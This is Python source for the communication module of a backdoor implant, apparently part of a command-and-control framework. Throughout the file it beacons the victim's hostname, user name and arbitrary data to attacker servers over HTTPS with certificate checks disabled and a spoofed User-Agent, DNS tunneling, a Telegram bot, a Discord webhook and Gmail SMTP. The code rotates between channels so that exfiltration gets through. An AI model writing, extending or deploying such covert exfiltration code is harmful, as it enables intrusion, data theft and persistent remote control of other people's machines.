"""
Multi-protocol communication handler for C2 operations.
"""
import json
import base64
import zlib
import time
import uuid
from datetime import datetime
import platform
import getpass
import requests
import socket

from config import Config
from crypto import CryptoManager


class CommunicationManager:
    """Multi-protocol communication handler"""

    def __init__(self):
        self.current_protocol = 0
        self.session_id = str(uuid.uuid4())
        self.sequence = 0

    def send(self, data: dict) -> dict:
        """Send data through available protocol"""

        # Add metadata
        data['_meta'] = {
            'session_id': self.session_id,
            'sequence': self.sequence,
            'timestamp': datetime.now().isoformat(),
            'hostname': platform.node(),
            'user': getpass.getuser()
        }
        self.sequence += 1

        # Try protocols in order
        for i in range(len(Config.C2_SERVERS)):
            protocol = Config.C2_SERVERS[self.current_protocol]
            self.current_protocol = (self.current_protocol + 1) % len(Config.C2_SERVERS)

            try:
                if protocol['protocol'] == 'https':
                    response = self._send_https(protocol, data)
                elif protocol['protocol'] == 'dns':
                    response = self._send_dns(protocol, data)
                elif protocol['protocol'] == 'telegram':
                    response = self._send_telegram(protocol, data)
                elif protocol['protocol'] == 'discord':
                    response = self._send_discord(protocol, data)
                elif protocol['protocol'] == 'gmail':
                    response = self._send_gmail(protocol, data)
                else:
                    continue

                if response:
                    return response

            except Exception as e:
                print(f"[!] Protocol {protocol['protocol']} failed: {e}")
                continue

        return None

    def _send_https(self, protocol: dict, data: dict) -> dict:
        """Send via HTTPS POST"""

        # Encrypt data
        json_data = json.dumps(data).encode()
        if Config.ENCRYPT_COMMS:
            json_data = CryptoManager.encrypt(json_data)

        if Config.COMPRESS_DATA:
            json_data = zlib.compress(json_data)

        # Encode for transmission
        encoded = base64.b64encode(json_data).decode()

        # Send request
        url = f"{protocol['protocol']}://{protocol['host']}:{protocol['port']}{protocol['path']}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'X-Session-ID': self.session_id
        }

        response = requests.post(
            url,
            json={'data': encoded},
            headers=headers,
            timeout=30,
            verify=False  # For self-signed certs
        )

        if response.status_code == 200:
            # Decode response
            resp_data = response.json().get('data', '')
            if resp_data:
                decoded = base64.b64decode(resp_data)
                if Config.COMPRESS_DATA:
                    decoded = zlib.decompress(decoded)
                if Config.ENCRYPT_COMMS:
                    decoded = CryptoManager.decrypt(decoded)
                return json.loads(decoded.decode())

        return None

    def _send_dns(self, protocol: dict, data: dict) -> dict:
        """Send via DNS tunneling"""

        # Convert data to subdomain
        json_str = json.dumps(data)
        encoded = base64.b32encode(json_str.encode()).decode().lower()

        # Split into chunks
        chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]

        for chunk in chunks:
            domain = f"{chunk}.{protocol['domain']}"
            try:
                socket.gethostbyname(domain)
                time.sleep(0.1)
            except:
                pass

        # DNS responses can't contain much data
        # We'd need to query TXT records for commands
        # This is simplified
        return {'command': 'continue'}

    def _send_telegram(self, protocol: dict, data: dict) -> dict:
        """Send via Telegram bot"""

        message = f"📡 Beacon from {platform.node()}\n"
        message += f"User: {getpass.getuser()}\n"
        message += f"Time: {datetime.now()}\n"
        message += f"Data: {json.dumps(data, indent=2)[:1000]}"

        url = f"https://api.telegram.org/bot{protocol['bot_token']}/sendMessage"
        payload = {
            'chat_id': protocol['chat_id'],
            'text': message,
            'parse_mode': 'HTML'
        }

        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            # Check for commands in response
            # In real implementation, would get updates
            return {'command': 'idle'}

        return None

    def _send_discord(self, protocol: dict, data: dict) -> dict:
        """Send via Discord webhook"""

        embed = {
            "title": "🔔 Backdoor Beacon",
            "description": f"System: {platform.node()}",
            "fields": [
                {"name": "User", "value": getpass.getuser(), "inline": True},
                {"name": "Time", "value": datetime.now().isoformat(), "inline": True}
            ],
            "timestamp": datetime.now().isoformat()
        }

        payload = {
            "embeds": [embed],
            "content": f"```json\n{json.dumps(data, indent=2)[:1500]}\n```"
        }

        response = requests.post(protocol['webhook'], json=payload, timeout=30)
        if response.status_code in [200, 204]:
            return {'command': 'wait'}

        return None

    def _send_gmail(self, protocol: dict, data: dict) -> dict:
        """Send via Gmail SMTP"""
        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart

            # Create email
            msg = MIMEMultipart()
            msg['From'] = f"backdoor@{platform.node()}"
            msg['To'] = protocol['email']
            msg['Subject'] = f"Beacon {self.session_id[:8]}"

            body = json.dumps(data, indent=2)
            msg.attach(MIMEText(body, 'plain'))

            # Send via SMTP
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(protocol['email'], protocol['app_password'])
                server.send_message(msg)
            return {'command': 'sent'}
        except Exception as e:
            print(f"[!] Gmail send failed: {e}")
            return None